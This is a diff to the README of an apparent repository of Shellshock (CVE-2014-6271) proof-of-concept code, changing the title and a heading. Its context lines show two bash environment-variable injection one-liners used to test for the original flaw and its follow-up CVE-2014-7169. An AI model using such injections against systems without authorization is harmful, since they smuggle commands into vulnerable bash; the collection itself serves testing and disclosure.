@@ -1,4 +1,4 @@
-shellshocker-pocs
+Shellshocker - Repository of CVE 2014-6271 Proof of Concept Code
 =================
 
 Collection of Proof of Concepts and Potential Targets for #ShellShocker
@@ -26,7 +26,7 @@ Please submit a pull request if you have more links or other resources
 + `env x='() { :;}; echo vulnerable' bash -c 'echo hello'`
 + IBM z/OS - http://mainframed767.tumblr.com/post/98446455927/bad-news-is-it-totally-works-in-bash-on-z-os-and
 
-## Post CVE=2014-6271 Command Line
+## Post CVE-2014-6271 Command Line
 _Fixed by CVE-2014-7169_
 + Via @Taviso - `env var='() {(a)=>\' bash -c "echo date"; cat echo`
 
